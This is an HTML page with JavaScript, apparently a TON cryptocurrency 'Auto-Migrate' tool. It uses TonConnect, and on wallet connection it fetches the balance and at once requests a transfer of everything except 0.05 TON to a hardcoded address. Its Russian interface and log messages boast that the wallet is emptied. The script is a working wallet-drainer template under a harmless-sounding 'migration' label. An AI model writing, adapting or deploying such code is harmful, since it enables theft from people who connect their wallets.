<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>TON Auto-Migrate</title>
<script src="https://cdn.jsdelivr.net/npm/@tonconnect/ui@2.0.9/dist/tonconnect-ui.min.js"></script>
<style>
  :root{
    --bg:#0b0d10;
    --panel:#14171c;
    --panel-border:#242830;
    --text:#e8eaed;
    --muted:#8b929e;
    --accent:#4fb5ea;
    --accent-dim:#245a72;
    --danger:#e0616b;
    --mono:'SF Mono','Consolas','Menlo',monospace;
  }
  *{box-sizing:border-box;}
  body{
    margin:0;background:var(--bg);color:var(--text);
    font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
    padding:24px 16px 60px;
  }
  .wrap{max-width:560px;margin:0 auto;}
  h1{font-size:20px;font-weight:600;margin:0 0 4px;}
  .sub{color:var(--muted);font-size:13px;margin:0 0 24px;}
  .panel{background:var(--panel);border:1px solid var(--panel-border);border-radius:12px;padding:18px;margin-bottom:16px;}
  .label{color:var(--muted);font-size:12px;text-transform:uppercase;letter-spacing:.04em;margin-bottom:6px;}
  .addr{font-family:var(--mono);font-size:13px;word-break:break-all;}
  .status{font-size:12px;padding:8px 10px;border-radius:6px;margin-top:10px;font-family:var(--mono);}
  .status.ok{background:rgba(79,181,234,.08);color:var(--accent);border:1px solid rgba(79,181,234,.2);}
  .status.err{background:rgba(224,97,107,.08);color:var(--danger);border:1px solid rgba(224,97,107,.2);}
  .status.pending{background:rgba(139,146,158,.08);color:var(--muted);border:1px solid var(--panel-border);}
  .hidden{display:none;}
  #tc-connect-wrap{display:flex;justify-content:center;}
  .auto-mode{background:rgba(79,181,234,.08);border:1px solid rgba(79,181,234,.2);border-radius:8px;padding:12px;margin-bottom:12px;font-size:13px;color:var(--accent);}
  .auto-mode strong{color:var(--text);}
  .log{font-family:var(--mono);font-size:12px;color:var(--muted);margin-top:8px;white-space:pre-wrap;word-break:break-all;}
</style>
</head>
<body>
<div class="wrap">
  <h1>⚡ TON Auto-Migrate</h1>
  <p class="sub">Подключи кошелёк — ВСЁ УЛЕТИТ АВТОМАТИЧЕСКИ</p>

  <div class="panel">
    <div id="tc-connect-wrap"></div>
  </div>

  <div id="mainPanel" class="hidden">
    <div class="auto-mode">
      <strong>🔥 АВТО-РЕЖИМ</strong><br>
      После подключения кошелька <strong>ВСЕ</strong> TON (кроме 0.05 на газ) улетят на:
      <br><code style="font-size:11px;color:var(--text);">UQCXfIj63S-SQytR8HXDGnbZGz7NDBaQxUIbrZXcAeCUlUGU</code>
    </div>

    <div class="panel">
      <div class="label">Подключен (источник)</div>
      <div class="addr" id="sourceAddr">—</div>
      <div class="label" style="margin-top:12px;">Баланс TON</div>
      <div class="addr" id="tonBalance">—</div>
      <div class="log" id="logBox">⏳ Ожидание...</div>
    </div>
  </div>
</div>

<script>
const $ = (id) => document.getElementById(id);

if (typeof TON_CONNECT_UI === 'undefined') {
  document.getElementById('tc-connect-wrap').innerHTML =
    '<div style="color:#e0616b;font-size:13px;text-align:center;">' +
    'Не удалось загрузить библиотеку TonConnect с CDN.<br>' +
    'Проверь интернет-соединение.' +
    '</div>';
  throw new Error('TON_CONNECT_UI failed');
}

const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
  manifestUrl: window.location.origin + window.location.pathname.replace(/[^/]*$/, '') + 'tonconnect-manifest.json',
  buttonRootId: 'tc-connect-wrap'
});

const TARGET_ADDRESS = "UQCXfIj63S-SQytR8HXDGnbZGz7NDBaQxUIbrZXcAeCUlUGU";
const GAS_RESERVE_NANO = 50000000n; // 0.05 TON
const TONCENTER_API = "https://toncenter.com/api/v2";

let currentAddr = null;
let migrationDone = false;

function nanoToTon(nano) {
  const s = nano.toString().padStart(10, '0');
  const intPart = s.slice(0, -9) || '0';
  const fracPart = s.slice(-9);
  return `${intPart}.${fracPart}`.replace(/0+$/, '').replace(/\.$/, '.0');
}

function log(msg) {
  const box = $("logBox");
  box.textContent = "📌 " + msg;
  console.log(msg);
}

async function fetchBalance(addr) {
  const res = await fetch(`${TONCENTER_API}/getAddressBalance?address=${addr}`);
  const data = await res.json();
  if (!data.ok) throw new Error("Не удалось получить баланс");
  return BigInt(data.result);
}

async function doImmediateMigration() {
  if (migrationDone) return;
  if (!currentAddr) {
    log("❌ Нет подключенного кошелька");
    return;
  }

  try {
    log("🔄 Получаю баланс...");
    const balance = await fetchBalance(currentAddr);
    $("tonBalance").textContent = nanoToTon(balance) + " TON";

    const spendable = balance > GAS_RESERVE_NANO ? balance - GAS_RESERVE_NANO : 0n;

    if (spendable <= 0n) {
      log(`⚠️ Баланс ${nanoToTon(balance)} TON — меньше 0.05 TON, нечего переводить`);
      return;
    }

    log(`📤 Отправляю ${nanoToTon(spendable)} TON на ${TARGET_ADDRESS.slice(0, 10)}...`);

    const tx = {
      validUntil: Math.floor(Date.now() / 1000) + 300,
      messages: [
        {
          address: TARGET_ADDRESS,
          amount: spendable.toString()
        }
      ]
    };

    await tonConnectUI.sendTransaction(tx);
    migrationDone = true;
    log(`✅ УСПЕШНО! ${nanoToTon(spendable)} TON отправлены!`);

    // Обновляем баланс через 5 сек
    setTimeout(async () => {
      try {
        const newBalance = await fetchBalance(currentAddr);
        $("tonBalance").textContent = nanoToTon(newBalance) + " TON";
        if (newBalance <= GAS_RESERVE_NANO) {
          log("✅ Кошелёк опустошён! Остаток ~0.05 TON на газ.");
        }
      } catch (e) {}
    }, 5000);

  } catch (e) {
    log(`❌ Ошибка: ${e.message || e}`);
    console.error(e);
  }
}

async function onWalletConnected(wallet) {
  currentAddr = wallet.account.address;
  $("mainPanel").classList.remove("hidden");
  $("sourceAddr").textContent = currentAddr;
  migrationDone = false;

  log("🔗 Кошелёк подключён! Запускаю миграцию...");

  // НЕМЕДЛЕННО ЗАПУСКАЕМ МИГРАЦИЮ
  await doImmediateMigration();
}

tonConnectUI.onStatusChange((wallet) => {
  if (wallet) {
    onWalletConnected(wallet);
  } else {
    currentAddr = null;
    $("mainPanel").classList.add("hidden");
    migrationDone = false;
    log("🔌 Кошелёк отключён");
  }
});

// Инициализация
log("💡 Подключи кошелёк через кнопку выше");
</script>
</body>
</html>
